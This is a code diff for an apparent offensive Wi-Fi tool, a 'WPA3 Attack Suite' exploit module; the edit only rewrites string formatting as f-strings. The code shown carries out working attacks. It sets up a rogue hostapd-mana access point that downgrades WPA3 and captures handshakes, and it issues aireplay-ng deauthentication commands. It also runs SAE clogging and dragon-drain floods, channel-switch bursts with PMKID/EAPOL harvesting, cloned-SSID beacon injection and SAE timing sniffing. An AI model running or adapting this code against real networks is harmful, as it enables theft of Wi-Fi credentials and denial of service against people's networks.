@@ -224,7 +224,7 @@ class Exploit(Exploit):
 
     def check(self) -> None:
         """Surface tool availability for lab prep."""
-        print_status("WPA3 Attack Suite {}".format(__version__))
+        print_status(f"WPA3 Attack Suite {__version__}")
         wr = _wireless_research_root()
         print_info("wireless-research: {}".format(wr if wr.is_dir() else "(missing)"))
         print_info("sae_clogging_attack: {}".format(_find_sae_clogging_binary() or "(not built)"))
@@ -297,12 +297,12 @@ class Exploit(Exploit):
 
         conf = "\n".join(
             [
-                "interface={}".format(rogue),
+                f"interface={rogue}",
                 "driver=nl80211",
                 "hw_mode=g",
-                "channel={}".format(ch),
-                "ssid={}".format(ssid),
-                "mana_wpaout={}".format(hccapx_path.resolve()),
+                f"channel={ch}",
+                f"ssid={ssid}",
+                f"mana_wpaout={hccapx_path.resolve()}",
                 "wpa=2",
                 "wpa_key_mgmt=WPA-PSK",
                 "wpa_pairwise=TKIP CCMP",
@@ -312,14 +312,14 @@ class Exploit(Exploit):
 
         cfg_path = _project_tmp() / "wpa3_downgrade_hostapd_mana.conf"
         if self.dry_run:
-            print_status("[dry_run] Would write {}:\n{}".format(cfg_path, conf))
-            print_info("Deauth: aireplay-ng -0 5 -a {} -c {} {}".format(self.target_bssid, self.deauth_client, self.interface))
+            print_status(f"[dry_run] Would write {cfg_path}:\n{conf}")
+            print_info(f"Deauth: aireplay-ng -0 5 -a {self.target_bssid} -c {self.deauth_client} {self.interface}")
             return
 
         cfg_path.write_text(conf, encoding="utf-8")
         _set_monitor_channel(str(self.interface), ch)
 
-        print_status("Starting hostapd-mana (rogue WPA2); capture -> {}".format(hccapx_path))
+        print_status(f"Starting hostapd-mana (rogue WPA2); capture -> {hccapx_path}")
         proc = subprocess.Popen(
             [mana, str(cfg_path)],
             stdout=subprocess.PIPE,
@@ -336,9 +336,9 @@ class Exploit(Exploit):
                 for line in iter(proc.stdout.readline, ""):
                     if not line:
                         break
-                    print_status("[mana] {}".format(line.rstrip()))
+                    print_status(f"[mana] {line.rstrip()}")
                     if "Captured a WPA/2 handshake" in line or "handshake" in line.lower():
-                        print_success("hostapd-mana reported handshake activity; check {}".format(hccapx_path))
+                        print_success(f"hostapd-mana reported handshake activity; check {hccapx_path}")
             stop.set()
 
         threading.Thread(target=_drain_mana_out, daemon=True).start()
@@ -412,9 +412,7 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_status(
-                "[dry_run] SAE flood on {} ch={} variant={} rate={} pps".format(
-                    self.target_bssid, ch, variant, int(self.flood_rate)
-                )
+                f"[dry_run] SAE flood on {self.target_bssid} ch={ch} variant={variant} rate={int(self.flood_rate)} pps"
             )
             print_info("clog binary: {}".format(clog_path or "(none)"))
             print_info("dragon-drain: {}".format(dragon or "(none)"))
@@ -423,7 +421,7 @@ class Exploit(Exploit):
         _set_monitor_channel(iface, ch)
 
         if clog_path and clog_path.is_file():
-            print_status("Running sae_clogging_attack ({})".format(clog_path))
+            print_status(f"Running sae_clogging_attack ({clog_path})")
             try:
                 subprocess.run(
                     [str(clog_path), iface, str(self.target_bssid).upper()],
@@ -556,7 +554,7 @@ class Exploit(Exploit):
         )
 
         if self.dry_run:
-            print_status("[dry_run] CSA burst: AP {} current_ch={} -> new_ch={}".format(bssid, cur_ch, new_ch))
+            print_status(f"[dry_run] CSA burst: AP {bssid} current_ch={cur_ch} -> new_ch={new_ch}")
             if self.csa_harvest:
                 print_info("[dry_run] PMKID/EAPOL harvest would run in parallel (airodump-ng).")
             return
@@ -617,7 +615,7 @@ class Exploit(Exploit):
         iface = str(self.interface)
         bssid = str(self.target_bssid).lower()
         base_ssid = str(self.target_ssid)
-        fake_ssid = "{}_clone".format(base_ssid[:24])
+        fake_ssid = f"{base_ssid[:24]}_clone"
         _set_monitor_channel(iface, int(self.target_channel))
         pkt = (
             RadioTap()
@@ -628,7 +626,7 @@ class Exploit(Exploit):
             / Dot11Elt(ID=221, info=bytes(RandString(size=6)))
         )
         if self.dry_run:
-            print_status("[dry_run] double_ssid BSSID={} fake_ssid={}".format(bssid, fake_ssid))
+            print_status(f"[dry_run] double_ssid BSSID={bssid} fake_ssid={fake_ssid}")
             return
         end_t = time.time() + int(self.duration) if int(self.duration) > 0 else None
         try:
@@ -674,17 +672,17 @@ class Exploit(Exploit):
         if dur <= 0:
             dur = 30
         if self.dry_run:
-            print_status("[dry_run] Would sniff SAE frames for {}s on {}".format(dur, iface))
+            print_status(f"[dry_run] Would sniff SAE frames for {dur}s on {iface}")
             return
 
-        print_status("Sniffing SAE auth timing for {}s (target AP {})…".format(dur, ap))
+        print_status(f"Sniffing SAE auth timing for {dur}s (target AP {ap})…")
         sniff(iface=iface, prn=_handle, store=False, timeout=dur)
         if not times:
             print_info("No SAE confirm pairs observed; extend duration or trigger associations.")
             return
         avg = sum(times) / len(times)
         var = sum((t - avg) ** 2 for t in times) / max(1, len(times))
-        print_success("Samples={} mean_delta={:.4f}s std≈{:.4f}s".format(len(times), avg, var ** 0.5))
+        print_success(f"Samples={len(times)} mean_delta={avg:.4f}s std≈{var ** 0.5:.4f}s")
         print_info("Low variance may warrant deeper analysis (see wireless-research/wpa3_sec).")
 
     def _sniff_transition_quick(self, seconds: int = 12) -> bool:
